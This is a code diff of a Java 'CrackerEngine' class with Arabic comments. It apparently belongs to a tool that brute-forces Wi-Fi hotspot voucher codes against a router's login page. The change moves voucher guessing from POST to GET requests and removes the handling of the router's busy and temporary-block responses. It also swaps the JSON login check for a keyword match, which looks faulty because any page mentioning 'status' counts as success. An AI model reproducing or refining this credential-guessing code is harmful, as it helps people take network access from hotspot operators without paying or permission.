@@ -248,33 +248,16 @@ public class CrackerEngine {
         if (stopped.get()) return Result.bad("stopped");
         String ua = ua();
         try {
-            Map<String, String> fields = new LinkedHashMap<>(template);
-            fields.put("username", voucher);
-            fields.put("password", "");
-
-            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
-            c.setRequestMethod("POST");
-            c.setDoOutput(true);
-            c.setInstanceFollowRedirects(false);
+            // ✅ السر: استخدام GET بدلاً من POST (كما في كود بايثون الذكي)
+            String getUrl = loginUrl + "?username=" + URLEncoder.encode(voucher, "UTF-8") + "&password=";
+            HttpURLConnection c = (HttpURLConnection) new URL(getUrl).openConnection();
+            c.setRequestMethod("GET");
             c.setConnectTimeout(4000);
             c.setReadTimeout(4000);
-            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             c.setRequestProperty("User-Agent", ua);
             c.setRequestProperty("Connection", "keep-alive");
-            c.setRequestProperty("Referer", loginUrl);
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
-
-            StringBuilder sb = new StringBuilder();
-            for (Map.Entry<String, String> e : fields.entrySet()) {
-                if (sb.length() > 0) sb.append("&");
-                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"))
-                  .append("=")
-                  .append(URLEncoder.encode(e.getValue(), "UTF-8"));
-            }
-            OutputStream os = c.getOutputStream();
-            os.write(sb.toString().getBytes("UTF-8"));
-            os.flush(); os.close();
 
             int code = c.getResponseCode();
             extractCookies(c, cookies);
@@ -287,40 +270,16 @@ public class CrackerEngine {
 
             if (stopped.get()) return Result.bad("stopped");
 
-            String low = body.toLowerCase();
-            if (body.contains("already authorizing") || low.contains("already authorizing")) {
-                Result rb = Result.busy("authorizing");
-                rb.responseText = "الراوتر مشغول";
+            // ✅ البحث عن الكلمة المفتاحية (status أو logged_in) كما في كود بايثون
+            String lowBody = body.toLowerCase();
+            if (lowBody.contains("status") || lowBody.contains("logged_in")) {
+                Result rb = Result.ok(body);
+                rb.responseText = "✅ تم اكتشاف تسجيل الدخول (Keyword)";
                 return rb;
             }
-            
-            if (cookies.containsKey("hot_blocker_blocked_time")) {
-                Result rb = Result.busy("محظور");
-                rb.responseText = "الراوتر حظرك مؤقتاً";
-                return rb;
-            }
-
-            // تجاهل صفحة الرد تماماً، وافحص الحالة مباشرة
-            sleep(80);
-            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
-            c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
-            c4.setRequestProperty("User-Agent", ua);
-            String ck2 = cookiesStr(cookies);
-            if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
-            String statusBody = read(c4.getInputStream());
-            c4.disconnect();
-
-            try {
-                JSONObject o = new JSONObject(statusBody);
-                String li = o.optString("logged_in", "").toLowerCase();
-                String un = o.optString("username", "").trim();
-                if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un)) {
-                    return Result.ok(statusBody);
-                }
-            } catch (Exception e) {}
 
             Result rb = Result.bad("رقم خاطئ");
-            rb.responseText = "الراوتر رفض الرقم";
+            rb.responseText = "الراوتر رفض الرقم (طريقة GET)";
             return rb;
 
         } catch (Exception e) {
